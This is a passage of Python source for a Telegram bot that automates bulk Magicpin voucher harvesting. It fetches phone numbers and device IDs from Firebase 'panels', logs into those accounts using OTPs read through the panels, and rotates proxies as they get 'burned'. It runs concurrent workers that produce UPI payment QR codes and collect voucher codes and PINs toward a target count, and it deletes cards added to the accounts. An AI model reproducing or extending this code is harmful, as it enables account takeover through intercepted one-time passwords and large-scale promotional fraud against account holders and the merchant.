    return MAIN_MENU


async def _deliver_one_qr(message, r: dict) -> str:
    wid = r.get("worker", "?")
    uri = r.get("upi_uri") or ""
    inst = r.get("instrument", "?")

    sid = save_session_from_result(r)
    r["session_id"] = sid
    BATCH.setdefault("results", {})[sid] = r
    BATCH["results"][str(wid)] = r

    qr_path = f"upi_qr_{sid}.png"
    amt = r.get("pg_amt")
    amt_str = f"₹{amt:.2f}" if amt is not None else "₹?"
    # Extract a readable panel name from the firebase URL
    _furl = (r.get("firebase_url") or "").rstrip("/")
    _panel_name = _furl.split("//")[-1].split(".")[0] if _furl else "?"
    _panel_did  = r.get("device_id") or "?"
    caption = (
        f"💰 <b>AMOUNT: {amt_str}</b>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"💸 <b>W{wid}</b> · <code>{r.get('phone')}</code> · {inst}\n"
        f"🔥 Panel: <code>{_panel_name}</code> · ID: <code>{_panel_did}</code>\n"
        f"🆔 <code>{sid}</code>\n"
        f"Session saved · pay then tap button"
    )
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton(
            f"✅ I have paid (W{wid})",
            callback_data=f"paid:{sid}",
        )],
        [InlineKeyboardButton(
            "🎟️ Fetch voucher only",
            callback_data=f"sv:{sid}",
        )],
    ])
    # Retry photo upload up to 3x with hard 20 s timeout each.
    # Concurrent workers uploading PNGs simultaneously cause Telegram timeouts.
    buf = make_qr_bytes(uri) if uri else None
    photo_sent = False
    if buf:
        for _attempt in range(3):
            buf.seek(0)
            try:
                await asyncio.wait_for(
                    message.reply_photo(
                        photo=buf,
                        caption=caption,
                        parse_mode="HTML",
                        reply_markup=keyboard,
                    ),
                    timeout=20.0,
                )
                photo_sent = True
                break
            except asyncio.TimeoutError:
                log.warning(f"deliver QR timeout (attempt {_attempt + 1}/3)")
                await asyncio.sleep(2 ** _attempt)
            except Exception as e:
                log.warning(f"deliver QR failed (attempt {_attempt + 1}/3): {e}")
                await asyncio.sleep(2 ** _attempt)

    if not photo_sent:
        # Fallback — raw URI so user can still pay without a QR image
        uri_line = f"\n\n🔗 <code>{uri}</code>" if uri else ""
        try:
            await message.reply_text(
                caption + uri_line + "\n\n⚠️ QR image unavailable — copy link above to pay.",
                parse_mode="HTML",
                reply_markup=keyboard,
            )
        except Exception as e2:
            log.warning(f"deliver QR text fallback failed: {e2}")
    return sid


def _finish_one_paid_sync(r: dict) -> Optional[dict]:
    token = r["token"]
    uid = r["uid"]
    proxies = r.get("proxies")
    cards_before = set(r.get("cards_before") or [])
    base_txn_id = r.get("base_txn_id") or 0
    txn = r.get("txn", "")

    time.sleep(15)
    try:
        cards_after = list_saved_card_ids(token, uid, proxies=proxies)
        for cid in cards_after - set(cards_before):
            delete_card(cid, token, uid, proxies=proxies)
    except Exception as e:
        log.warning(f"_finish_one_paid_sync card cleanup error (non-fatal): {e}")

    numeric = poll_new_voucher(
        token, uid, min_txn_id=base_txn_id,
        poll_seconds=120, interval=4, proxies=proxies,
    )
    if not numeric:
        return None
    return fetch_voucher_by_numeric(
        numeric, token, uid, pg_txn=txn, proxies=proxies
    )


# ── Background delayed-voucher poller ────────────────────────────────────────
# When Magicpin returns "generating your code" we don't show a dash.
# Instead we send a "⏳ generating" message and launch this background task
# which keeps polling every PENDING_POLL_INTERVAL seconds for up to
# PENDING_POLL_TIMEOUT seconds, then fires a new Telegram message when ready.

PENDING_POLL_INTERVAL = 30   # seconds between checks
PENDING_POLL_TIMEOUT  = 600  # 10 minutes max wait


async def _poll_until_voucher_ready(
    message,           # telegram Message to reply into
    sid: str,
    numeric: int,
    token: str,
    uid: str,
    txn: str,
    proxies: Optional[dict],
    phone: str,
    r: dict,           # original worker result (for panel info display)
    context,
):
    """
    Background coroutine — keeps fetching the voucher URL until the code
    and pin are both populated, then fires a new Telegram message.
    Gives up after PENDING_POLL_TIMEOUT and tells the user.
    """
    deadline = time.time() + PENDING_POLL_TIMEOUT
    attempt  = 0

    while time.time() < deadline:
        attempt += 1
        await asyncio.sleep(PENDING_POLL_INTERVAL)
        log.info(f"[PendingPoll] sid={sid} attempt={attempt} numeric={numeric}")

        try:
            voucher = await asyncio.to_thread(
                fetch_voucher_by_numeric,
                numeric, token, uid, txn, proxies,
                8,    # retries
                5.0,  # retry_gap
            )
        except Exception as e:
            log.warning(f"[PendingPoll] fetch error: {e}")
            continue

        if not voucher:
            continue

        # Still generating — keep waiting
        if voucher.get("pending_generation") and not voucher.get("complete"):
            log.info(f"[PendingPoll] still generating for {phone}")
            continue

        # Got it — complete or best-effort
        update_session(sid, status="voucher_ready", voucher=voucher)
        _append_voucher_record(voucher, numeric=numeric, uid=uid)

        # Always count — even if batch went inactive while this poller was waiting
        # _batch_increment_completed deduplicates by sid so no double-count
        completed_now = _batch_increment_completed(sid)
        target = BATCH.get("target", "-")
        extra = f"\nProgress: <b>{completed_now}/{target}</b>" if target else ""

        await _safe_reply(
            message,
            "✅ <b>Voucher code is ready!</b>\n\n"
            + _format_voucher_msg(phone, voucher, extra, r=r),
            parse_mode="HTML",
            reply_markup=_voucher_actions_keyboard(sid),
        )

        if BATCH.get("active"):
            try:
                await _maybe_advance_batch(message, context)
            except Exception as e:
                log.warning(f"[PendingPoll] advance batch: {e}")
        return

    # Timed out
    log.warning(f"[PendingPoll] timed out for sid={sid} phone={phone}")
    update_session(sid, status="pending_timeout")
    await _safe_reply(
        message,
        f"⚠️ <b>Voucher still not ready after {PENDING_POLL_TIMEOUT // 60} min</b>\n"
        f"📱 <code>{phone}</code>\n"
        f"Use 🔄 Relogin & fetch or 🔁 Refetch to check manually.",
        parse_mode="HTML",
        reply_markup=_voucher_actions_keyboard(sid),
    )


def _batch_ready_for_next() -> bool:
    if not BATCH.get("workers_finished"):
        return False
    need_pay = {
        k for k in BATCH.get("results", {}).keys()
        if isinstance(k, str) and len(k) == 8 and k.isalnum()
    }
    if not need_pay:
        return True
    return need_pay.issubset(BATCH.get("paid", set()))


async def _safe_reply(message, text: str, **kwargs):
    last = None
    for attempt in range(4):
        try:
            return await message.reply_text(text, **kwargs)
        except Exception as e:
            last = e
            log.warning(f"Telegram reply attempt {attempt+1}/4: {e}")
            await asyncio.sleep(1.5 * (attempt + 1))
    log.warning(f"Telegram reply gave up: {last}")
    return None


def _schedule_next_batch(message, context):
    try:
        loop = asyncio.get_running_loop()
        task = loop.create_task(_start_next_batch_safe(message, context))
        BATCH["bg_task"] = task
    except Exception as e:
        log.warning(f"schedule next batch: {e}")


async def _start_next_batch_safe(message, context):
    try:
        await _start_next_batch(message, context)
    except asyncio.CancelledError:
        log.info("background batch cancelled")
        BATCH["active"] = False
        raise
    except Exception as e:
        log.exception(f"background batch error: {e}")
        await _safe_reply(
            message,
            f"⚠️ Batch hiccup: <code>{type(e).__name__}</code> — retrying…",
            parse_mode="HTML",
        )
        if (
            not BATCH.get("stop")
            and BATCH.get("completed", 0) < BATCH.get("target", 0)
        ):
            await asyncio.sleep(3)
            _schedule_next_batch(message, context)
        else:
            BATCH["active"] = False
            await _safe_reply(
                message,
                "❌ Batch stopped. /start to run again.",
                reply_markup=main_keyboard(),
            )


async def _maybe_advance_batch(message, context):
    """
    Called after each voucher delivery (paid callback / pending poller).
    Just checks if target is reached and sends the final message.
    NO re-firing of workers — the continuous queue loop handles that.
    """
    if BATCH.get("stop"):
        BATCH["active"] = False
        return

    c = BATCH.get("completed", 0)
    t = BATCH.get("target", 0)

    if c >= t:
        BATCH["active"] = False
        u = len(BATCH.get("used_phones") or set())
        await _safe_reply(
            message,
            f"🏁 <b>All done! Target reached.</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"✅ Completed      : <b>{c}/{t}</b>\n"
            f"📵 Numbers used   : <b>{u}</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"Bot is idle. Press /start to run again.",
            parse_mode="HTML",
            reply_markup=main_keyboard(),
        )
    # If target not reached — workers are still running from the queue, do nothing


def _session_to_worker_result(s: dict) -> dict:
    return {
        "phone":        s.get("phone"),
        "token":        s.get("token"),
        "uid":          s.get("uid"),
        "txn":          s.get("txn"),
        "base_txn_id":  s.get("base_txn_id") or 0,
        "cards_before": s.get("cards_before") or [],
        "proxy":        s.get("proxy"),
        "proxies":      proxy_dict(s.get("proxy")),
        "instrument":   s.get("instrument"),
        "pg_amt":       s.get("pg_amt"),
        "upi_uri":      s.get("upi_uri"),
        "session_id":   s.get("id"),
        "worker":       s.get("worker"),
        "device_id":    s.get("device_id"),     # needed by pending poller
        "firebase_url": s.get("firebase_url"),  # needed by pending poller
        "numeric":      s.get("numeric"),        # needed by pending poller
    }


def _voucher_actions_keyboard(sid: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("🔄 Relogin & fetch", callback_data=f"rl:{sid}"),
            InlineKeyboardButton("🔁 Refetch only", callback_data=f"sv:{sid}"),
        ],
    ])


def _format_voucher_msg(phone, voucher, extra: str = "", r: dict = None) -> str:
    pending = voucher.get("pending_generation", False)
    incomplete = not voucher.get("complete") and not pending and (
        voucher.get("code") in (None, "-", "") or voucher.get("pin") in (None, "-", "")
    )

    if pending:
        warn = "\n⏳ <b>Code being generated by Magicpin — will auto-update.</b>\n"
    elif incomplete:
        warn = "\n⚠️ <b>Code/PIN missing</b> — Magicpin may need a relogin.\n"
    else:
        warn = ""

    code_display = "⏳ generating…" if pending and voucher.get("code") in (None, "-", "") else voucher.get("code", "-")
    pin_display  = "⏳ generating…" if pending and voucher.get("pin")  in (None, "-", "") else voucher.get("pin",  "-")

    panel_line = ""
    if r:
        _furl = (r.get("firebase_url") or "").rstrip("/")
        _pname = _furl.split("//")[-1].split(".")[0] if _furl else "?"
        _pdid  = r.get("device_id") or "?"
        panel_line = f"🔥 Panel: <code>{_pname}</code> · ID: <code>{_pdid}</code>\n"
    return (
        f"🎟️ <b>Voucher</b> · <code>{phone}</code>\n"
        f"{panel_line}"
        f"🏬 {voucher.get('merchant', '-')}\n"
        f"💰 {voucher.get('value', '-')}\n"
        f"🔑 <code>{code_display}</code>\n"
        f"🔒 <code>{pin_display}</code>"
        f"{warn}{extra}"
    )


def _relogin_and_fetch_sync(s: dict) -> Tuple[Optional[dict], str]:
    phone = s.get("phone")
    if not phone:
        return None, "No phone on session"
    device_id = s.get("device_id")
    firebase_url = s.get("firebase_url")
    proxy = s.get("proxy")
    proxies = proxy_dict(proxy)

    if not (device_id and firebase_url) and RUNTIME.get("firebase_urls"):
        for url in RUNTIME["firebase_urls"]:
            try:
                found = fetch_phones_from_panel(url, limit=200)
            except Exception:
                continue
            for p, did in found:
                if normalize_phone(p) == normalize_phone(phone) or p.endswith(
                    normalize_phone(phone)[-10:]
                ):
                    device_id, firebase_url = did, url
                    break
            if device_id:
                break

    if not (device_id and firebase_url):
        return None, "No panel/device for this phone — cannot get OTP"

    tag = f"[RL {phone[-4:]}]"
    result = _try_login_with_otp_rotating(phone, device_id, firebase_url, tag)
    token, uid, device, info = result[0], result[1], result[2], result[3]
    # relogin is a manual one-off — proxy is not burned after it,
    # user may re-use the same session. Release any lock left from login.
    _rl_proxy = result[4] if len(result) > 4 else None
    if _rl_proxy:
        PROXY_POOL.release(_rl_proxy)
    if token is None:
        return None, f"Relogin failed: {info}"

    phone = info if isinstance(info, str) and info.isdigit() else phone
    update_session(
        s["id"],
        token=token,
        uid=uid,
        device_id=device_id,
        firebase_url=firebase_url,
        proxy=proxy,
        status="relogged",
    )

    numeric, _ = ledger_newest_voucher_txn(token, uid, min_txn_id=0, proxies=proxies)
    if not numeric:
        return None, "Logged in but no voucher in ledger yet"
    voucher = fetch_voucher_by_numeric(
        numeric, token, uid, pg_txn=s.get("txn"), proxies=proxies
    )
    if not voucher:
        return None, "Logged in but voucher fetch failed"
    return voucher, "OK"


async def _paid_background(message, context, sid: str, r: dict):
    try:
        voucher = await asyncio.to_thread(_finish_one_paid_sync, r)
    except Exception as e:
        log.exception(f"paid fetch error: {e}")
        await _safe_reply(
            message,
            f"❌ Fetch error: <code>{e}</code>\n"
            f"Try 🔄 Relogin from 💾 Saved.",
            parse_mode="HTML",
            reply_markup=_voucher_actions_keyboard(sid),
        )
        update_session(sid, status="failed")
        return

    if not voucher:
        update_session(sid, status="paid")
        await _safe_reply(
            message,
            f"❌ No voucher yet for <code>{r.get('phone')}</code>.\n"
            f"Use Relogin or Refetch below.",
            parse_mode="HTML",
            reply_markup=_voucher_actions_keyboard(sid),
        )
        if BATCH.get("active"):
            try:
                await _maybe_advance_batch(message, context)
            except Exception as e:
                log.warning(f"advance batch: {e}")
        return

    # ── Magicpin is still generating the code — don't show a dash ────────────
    if voucher.get("pending_generation") and not voucher.get("complete"):
        phone  = r.get("phone", "?")
        numeric = None
        # recover numeric from the session so the poller can use it
        s = get_session(sid)
        if s:
            numeric = s.get("numeric")
        if not numeric:
            # Try the persisted numeric from the session first
            numeric = r.get("numeric")
        if not numeric:
            # Last resort: scan ledger for newest voucher txn
            try:
                numeric, _ = await asyncio.to_thread(
                    ledger_newest_voucher_txn,
                    r["token"], r["uid"],
                    r.get("base_txn_id") or 0,  # min_txn_id
                    3,                           # max_pages
                    r.get("proxies"),            # proxies
                )
            except Exception:
                numeric = None

        update_session(sid, status="pending_generation")
        await _safe_reply(
            message,
            f"⏳ <b>Magicpin is generating your voucher code…</b>\n"
            f"📱 <code>{phone}</code>\n"
            f"🔄 I'll send it here automatically when it's ready "
            f"(checking every {PENDING_POLL_INTERVAL}s, up to {PENDING_POLL_TIMEOUT // 60} min).",
            parse_mode="HTML",
            reply_markup=_voucher_actions_keyboard(sid),
        )

        if numeric:
            asyncio.create_task(_poll_until_voucher_ready(
                message, sid, numeric,
                r["token"], r["uid"], r.get("txn", ""),
                r.get("proxies"), phone, r, context,
            ))
        else:
            # No numeric — fall back to relogin path in the message
            await _safe_reply(
                message,
                f"⚠️ Couldn't track numeric ID for <code>{phone}</code>.\n"
                f"Use 🔄 Relogin & fetch once Magicpin finishes generating.",
                parse_mode="HTML",
                reply_markup=_voucher_actions_keyboard(sid),
            )

        # Don't advance the batch yet — the poller will do it when code arrives
        return

    # ── Normal path: voucher received ────────────────────────────────────────
    # Always count — poller may deliver after batch went inactive
    # dedup by sid prevents double-count between paid_callback and poller
    completed_now = _batch_increment_completed(sid)
    update_session(sid, status="voucher_ready", voucher=voucher)
    extra = (
        f"\nProgress: <b>{completed_now}/"
        f"{BATCH.get('target', '-')}</b>"
    )
    await _safe_reply(
        message,
        _format_voucher_msg(r.get("phone"), voucher, extra, r=r),
        parse_mode="HTML",
        reply_markup=_voucher_actions_keyboard(sid),
    )

    if BATCH.get("active"):
        try:
            await _maybe_advance_batch(message, context)
        except Exception as e:
            log.warning(f"advance batch: {e}")


async def paid_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    try:
        await query.answer("Processing in background…")
    except Exception:
        pass
    if not allowed(update):
        return

    try:
        sid = query.data.split(":", 1)[1]
    except Exception:
        return

    if sid in BATCH.get("paid", set()):
        try:
            await query.answer("Already processed.", show_alert=False)
        except Exception:
            pass
        return

    r = (BATCH.get("results") or {}).get(sid)
    if not r:
        s = get_session(sid)
        if s:
            r = _session_to_worker_result(s)
        else:
            await _safe_reply(query.message, "❌ Session not found.")
            return

    BATCH.setdefault("paid", set()).add(sid)
    update_session(sid, status="paid")

    try:
        cap = (query.message.caption or query.message.text or "") + "\n\n👍 Paid — fetching voucher…"
        if query.message.photo:
            await query.edit_message_caption(caption=cap[:1024], parse_mode="HTML")
        else:
            await query.edit_message_text(cap[:4000], parse_mode="HTML")
    except Exception:
        pass

    asyncio.create_task(_paid_background(query.message, context, sid, r))


async def session_fetch_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    try:
        await query.answer("Fetching in background…")
    except Exception:
        pass
    if not allowed(update):
        return

    sid = query.data.split(":", 1)[1]
    s = get_session(sid)
    if not s or not s.get("token"):
        await _safe_reply(query.message, "❌ Session missing or incomplete.")
        return

    r = _session_to_worker_result(s)

    async def _work():
        try:
            voucher = await asyncio.to_thread(_finish_one_paid_sync, r)
        except Exception as e:
            await _safe_reply(
                query.message,
                f"❌ Error: <code>{e}</code>",
                parse_mode="HTML",
                reply_markup=_voucher_actions_keyboard(sid),
            )
            return
        if voucher:
            update_session(sid, status="voucher_ready", voucher=voucher)
            await _safe_reply(
                query.message,
                _format_voucher_msg(s.get("phone"), voucher, r=s),
                parse_mode="HTML",
                reply_markup=_voucher_actions_keyboard(sid),
            )
        else:
            await _safe_reply(
                query.message,
                f"❌ No voucher for <code>{s.get('phone')}</code> yet.\n"
                f"Try 🔄 Relogin & fetch.",
                parse_mode="HTML",
                reply_markup=_voucher_actions_keyboard(sid),
            )

    asyncio.create_task(_work())


async def relogin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    try:
        await query.answer("Relogin started…")
    except Exception:
        pass
    if not allowed(update):
        return
    sid = query.data.split(":", 1)[1]
    s = get_session(sid)
    if not s:
        await _safe_reply(query.message, "❌ Session not found.")
        return

    await _safe_reply(
        query.message,
        f"🔄 Relogin for <code>{s.get('phone')}</code>…\n"
        f"(send OTP → panel → login → fetch voucher)",
        parse_mode="HTML",
    )

    async def _work():
        try:
            voucher, msg = await asyncio.to_thread(_relogin_and_fetch_sync, s)
        except Exception as e:
            log.exception(f"relogin error: {e}")
            await _safe_reply(
                query.message,
                f"❌ Relogin error: <code>{e}</code>",
                parse_mode="HTML",
                reply_markup=_voucher_actions_keyboard(sid),
            )
            return
        if voucher:
            update_session(sid, status="voucher_ready", voucher=voucher)
            await _safe_reply(
                query.message,
                "🔄 Relogn OK\n" + _format_voucher_msg(s.get("phone"), voucher, r=s),
                parse_mode="HTML",
                reply_markup=_voucher_actions_keyboard(sid),
            )
        else:
            await _safe_reply(
                query.message,
                f"❌ Relogin/fetch failed: {msg}",
                parse_mode="HTML",
                reply_markup=_voucher_actions_keyboard(sid),
            )

    asyncio.create_task(_work())


async def session_delete_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if not allowed(update):
        return
    sid = query.data.split(":", 1)[1]
    if delete_session(sid):
        try:
            await query.edit_message_text(f"🗑 Session <code>{sid}</code> deleted.", parse_mode="HTML")
        except Exception:
            await query.message.reply_text("🗑 Deleted.")
    else:
        await query.message.reply_text("❌ Not found.")


def _sessions_keyboard(page: int = 0, per_page: int = 8) -> InlineKeyboardMarkup:
    sessions = load_sessions()
    start = page * per_page
    chunk = sessions[start:start + per_page]
    rows = []
    for s in chunk:
        phone = s.get("phone") or "?"
        st = s.get("status") or "?"
        icon = {"awaiting_payment": "⏳", "paid": "💳", "voucher_ready": "✅", "failed": "❌"}.get(st, "•")
        label = f"{icon} {phone} · {s.get('created_at', '')[-8:]}"
        rows.append([InlineKeyboardButton(label[:60], callback_data=f"so:{s['id']}")])
    nav = []
    if page > 0:
        nav.append(InlineKeyboardButton("⬅️ Prev", callback_data=f"sp:{page-1}"))
    if start + per_page < len(sessions):
        nav.append(InlineKeyboardButton("Next ➡️", callback_data=f"sp:{page+1}"))
    if nav:
        rows.append(nav)
    rows.append([InlineKeyboardButton("« Menu", callback_data="go_menu")])
    return InlineKeyboardMarkup(rows)


async def show_saved_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if not allowed(update):
        return
    sessions = load_sessions()
    if not sessions:
        await query.edit_message_text(
            "💾 No saved sessions yet.\nSessions are saved when a payment QR is generated.",
            reply_markup=main_keyboard(),
        )
        return
    await query.edit_message_text(
        f"💾 <b>Saved sessions</b> ({len(sessions)})\n"
        f"Tap one to open actions:",
        parse_mode="HTML",
        reply_markup=_sessions_keyboard(0),
    )


async def session_page_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if not allowed(update):
        return
    page = int(query.data.split(":")[1])
    await query.edit_message_text(
        f"💾 <b>Saved sessions</b> (page {page+1})",
        parse_mode="HTML",
        reply_markup=_sessions_keyboard(page),
    )


async def session_open_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if not allowed(update):
        return
    sid = query.data.split(":", 1)[1]
    s = get_session(sid)
    if not s:
        await query.edit_message_text("❌ Session gone.", reply_markup=main_keyboard())
        return
    v = s.get("voucher") or {}
    vline = ""
    if v:
        vline = (
            f"\n🎟️ {v.get('merchant')} | {v.get('value')}\n"
            f"Code <code>{v.get('code')}</code> Pin <code>{v.get('pin')}</code>\n"
        )
    text = (
        f"📱 <code>{s.get('phone')}</code>\n"
        f"ID: <code>{sid}</code>\n"
        f"Status: <b>{s.get('status')}</b>\n"
        f"UPI: {s.get('instrument')} · ₹{s.get('pg_amt')}\n"
        f"Created: {s.get('created_at')}\n"
        f"Txn: <code>{s.get('txn') or '-'}</code>"
        f"{vline}"
    )
    kb = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("🎟️ Fetch voucher", callback_data=f"sv:{sid}"),
            InlineKeyboardButton("🔄 Relogin & fetch", callback_data=f"rl:{sid}"),
        ],
        [
            InlineKeyboardButton("🔥 Firebase info", callback_data=f"sf:{sid}"),
            InlineKeyboardButton("✅ Mark paid + fetch", callback_data=f"paid:{sid}"),
        ],
        [
            InlineKeyboardButton("🗑 Delete", callback_data=f"sd:{sid}"),
            InlineKeyboardButton("« Back to list", callback_data="show_saved"),
        ],
    ])
    try:
        await query.edit_message_text(text, parse_mode="HTML", reply_markup=kb)
    except Exception:
        await query.message.reply_text(text, parse_mode="HTML", reply_markup=kb)


async def session_firebase_info_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if not allowed(update):
        return
    sid = query.data.split(":", 1)[1]
    s = get_session(sid)
    if not s:
        await query.edit_message_text("❌ Session gone.", reply_markup=main_keyboard())
        return

    phone = s.get("phone") or "-"
    device_id = s.get("device_id") or "-"
    fb = s.get("firebase_url") or "-"
    text = (
        f"🔥 <b>Firebase info</b>\n\n"
        f"📱 Number: <code>{phone}</code>\n"
        f"📟 Device ID: <code>{device_id}</code>\n"
        f"🔗 Panel link:\n<code>{fb}</code>\n\n"
        f"Session: <code>{sid}</code>"
    )
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("« Back to session", callback_data=f"so:{sid}")],
        [InlineKeyboardButton("« Saved list", callback_data="show_saved")],
    ])
    try:
        await query.edit_message_text(text, parse_mode="HTML", reply_markup=kb)
    except Exception:
        await query.message.reply_text(text, parse_mode="HTML", reply_markup=kb)


async def _run_batch_streaming(message, context, mode: int, batch_size: int,
                               phone_pool: list, proxies: list) -> int:
    phone_q: queue_mod.Queue = queue_mod.Queue()
    for item in phone_pool:
        phone_q.put(item)

    BATCH["active"] = True
    BATCH["results"] = {}
    BATCH["paid"] = set()
    BATCH["workers_finished"] = False
    BATCH["chat_id"] = message.chat_id
    BATCH["batch_size"] = batch_size
    BATCH["_voucher_counted"] = set()   # reset dedup set each run

    worker_counter = {"n": 0}

    def _spawn_worker() -> "asyncio.Task":
        worker_counter["n"] += 1
        wn = worker_counter["n"]
        async def _run():
            try:
                if mode == 1:
                    return await asyncio.to_thread(
                        worker_mode1_from_queue, phone_q, None, wn
                    )
                instrument = random.choice(["Phonepe", "Paytm"])
                return await asyncio.to_thread(
                    worker_mode2_from_queue, phone_q, None, instrument, wn
                )
            except Exception as e:
                log.exception(f"[W{wn}] worker crashed: {e}")
                return {
                    "worker": wn, "phone": "-", "proxy": None,
                    "ok": False, "msg": f"Worker crash: {e}",
                    "upi_uri": None, "txn": None,
                }
        return asyncio.create_task(_run())

    # Spawn initial batch of workers
    active_tasks: set = set()
    for _ in range(batch_size):
        active_tasks.add(_spawn_worker())

    ok_count        = 0
    PROXY_WAIT_POLL = 3    # seconds between pool checks when waiting
    PROXY_WAIT_MAX  = 60   # max poll attempts before truly giving up (3 min)

    def _target_reached_msg() -> str:
        c = BATCH.get("completed", 0)
        t = BATCH.get("target", 0)
        u = len(BATCH.get("used_phones") or set())
        return (
            f"🏁 <b>All done! Target reached.</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"✅ Completed      : <b>{c}/{t}</b>\n"
            f"📵 Numbers used   : <b>{u}</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"Bot is idle. Press /start to run again."
        )

    while active_tasks:
        done, active_tasks = await asyncio.wait(
            active_tasks, return_when=asyncio.FIRST_COMPLETED
        )

        for fut in done:
            try:
                r = fut.result()
            except Exception as e:
                log.exception(f"batch task error: {e}")
                await _safe_reply(
                    message, f"❌ Worker error: <code>{e}</code>",
                    parse_mode="HTML",
                )
                continue

            wid = r.get("worker", "?")

            # ── Pool exhausted — silently wait, spawn when free, one msg at end ─
            if r.get("pool_exhausted"):
                total = len(RUNTIME.get("proxies") or [])

                # Silent poll — no messages until truly dead
                freed = False
                for _ in range(PROXY_WAIT_MAX):
                    await asyncio.sleep(PROXY_WAIT_POLL)
                    if phone_q.empty():
                        break
                    if PROXY_POOL.available_count() > 0:
                        freed = True
                        break

                if freed:
                    # Silently spawn — no message to user
                    log.info("✅ Proxy freed — spawning worker silently.")
                    active_tasks.add(_spawn_worker())
                else:
                    # Only NOW send one clean final message
                    burned = PROXY_POOL.burned_count()
                    log.warning("🛑 Proxy pool truly dead — sending final stop message.")
                    await _safe_reply(
                        message,
                        f"🛑 <b>Process stopped — no proxies left.</b>\n\n"
                        f"🔥 <b>{burned}/{total}</b> proxies burned.\n"
                        f"📵 Numbers remaining in queue: <b>{phone_q.qsize()}</b>\n\n"
                        f"Remove burned proxies, add fresh ones, then restart.\n"
                        f"<i>Progress: {BATCH.get('completed', 0)}/{BATCH.get('target', '?')}</i>",
                        parse_mode="HTML",
                    )
                    for t in active_tasks:
                        t.cancel()
                    active_tasks.clear()
                continue

            # ── Normal result handling ────────────────────────────────────────
            if mode == 1:
                if r.get("ok") and r.get("voucher"):
                    ok_count += 1
                    completed_now = _batch_increment_completed()
                    v = r["voucher"]
                    _furl2  = (r.get("firebase_url") or "").rstrip("/")
                    _pname2 = _furl2.split("//")[-1].split(".")[0] if _furl2 else "?"
                    _pdid2  = r.get("device_id") or "?"
                    await _safe_reply(
                        message,
                        f"✅ <b>W{wid}</b> <code>{r['phone']}</code>\n"
                        f"🔥 Panel: <code>{_pname2}</code> · ID: <code>{_pdid2}</code>\n"
                        f"{v['merchant']} | {v['value']}\n"
                        f"Code <code>{v['code']}</code> Pin <code>{v['pin']}</code>\n"
                        f"Progress: <b>{completed_now}/{BATCH['target']}</b>",
                        parse_mode="HTML",
                    )
                else:
                    msg = r.get("msg", "")
                    _silent = ("coupon not applied", "otp_not_received", "otp not received",
                               "no phones left")
                    if not any(s in msg.lower() for s in _silent):
                        await _safe_reply(
                            message, f"❌ <b>W{wid}</b> — {msg}",
                            parse_mode="HTML",
                        )
            else:
                if r.get("ok") and r.get("upi_uri"):
                    ok_count += 1
                    BATCH["results"][str(wid)] = r
                    # NOTE: do NOT increment BATCH["completed"] here.
                    # Mode 2 completion is owned by _handle_paid / pending poller.
                    try:
                        await _deliver_one_qr(message, r)
                    except Exception as e:
                        log.warning(f"deliver QR error (non-fatal): {e}")
                else:
                    msg = r.get("msg", "")
                    _silent = ("coupon not applied", "otp_not_received", "otp not received",
                               "no phones left")
                    if not any(s in msg.lower() for s in _silent):
                        await _safe_reply(
                            message,
                            f"❌ <b>W{wid}</b> — {msg}",
                            parse_mode="HTML",
                        )

    BATCH["workers_finished"] = True

    # Workers done but pending pollers may still be fetching vouchers.
    # Wait up to 3 minutes for them to settle before showing final count.
    t = BATCH.get("target", 0)
    for _ in range(60):   # 60 × 3s = 3 min
        c = BATCH.get("completed", 0)
        pending = [
            s for s in BATCH.get("results", {}).values()
            if isinstance(s, dict) and s.get("status") not in ("voucher_ready", "failed", "cancelled")
        ]
        if c >= t or not pending:
            break
        await asyncio.sleep(3)

    # Read final counts after pollers settle
    c = BATCH.get("completed", 0)
    u = len(BATCH.get("used_phones") or set())
    BATCH["active"] = False

    if c >= t:
        await _safe_reply(
            message,
            f"🏁 <b>All done! Target reached.</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"✅ Completed      : <b>{c}/{t}</b>\n"
            f"📵 Numbers used   : <b>{u}</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"Bot is idle. Press /start to run again.",
            parse_mode="HTML",
            reply_markup=main_keyboard(),
        )
        return MAIN_MENU

    # Target not reached — queue drained or proxies dead
    await _safe_reply(
        message,
        f"🚫 <b>Queue empty — process stopped.</b>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"✅ Completed : <b>{c}/{t}</b>\n"
        f"📵 Used      : <b>{u}</b>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"Add more panels or proxies, then /start again.",
        parse_mode="HTML",
        reply_markup=main_keyboard(),
    )
    return MAIN_MENU


async def _start_next_batch(message, context) -> int:
    """
    Fetch ALL available phones from ALL panels upfront into one queue.
    Workers pull from the queue continuously — no re-firing, no rounds.
    Stops when: target reached | no phones left | proxy pool truly dead.
    """
    if BATCH.get("stop"):
        BATCH["active"] = False
        await _safe_reply(message, "⏹ Stopped.", reply_markup=main_keyboard())
        return MAIN_MENU

    mode      = BATCH.get("mode", 2)
    target    = BATCH["target"]
    completed = BATCH.get("completed", 0)
    remaining = target - completed
    workers   = RUNTIME.get("workers", 3)

    if remaining < 1:
        BATCH["active"] = False
        c = BATCH.get("completed", 0)
        t = BATCH.get("target", 0)
        u = len(BATCH.get("used_phones") or set())
        await _safe_reply(
            message,
            f"🏁 <b>All done! Target reached.</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
